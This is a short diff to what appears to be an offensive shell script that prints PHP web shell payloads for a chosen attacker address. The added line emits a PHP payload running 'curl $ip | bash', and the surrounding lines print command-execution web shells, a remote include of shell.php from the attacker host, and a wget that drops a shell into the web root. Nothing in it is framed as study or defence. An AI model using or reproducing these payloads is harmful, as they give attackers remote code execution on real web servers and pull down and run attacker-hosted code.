@@ -30,6 +30,7 @@ function listener {
 case "$1" in 
     "ph") #Php
         echo -e "<?php system(\$_REQUEST['cmd']); ?>";
+	echo -e "<?php system('curl $ip | bash'); ?>";
         echo -e "<?php include(\"http://$ip/shell.php\"); ?>";
         echo -e "<?php echo '<pre>'.shell_exec(\$_REQUEST['cmd']).'</pre>'; ?>"; 
         echo -e "<?php exec(\"wget -O /var/www/html/shell.php http://$ip/shell.php\"); ?>"; 
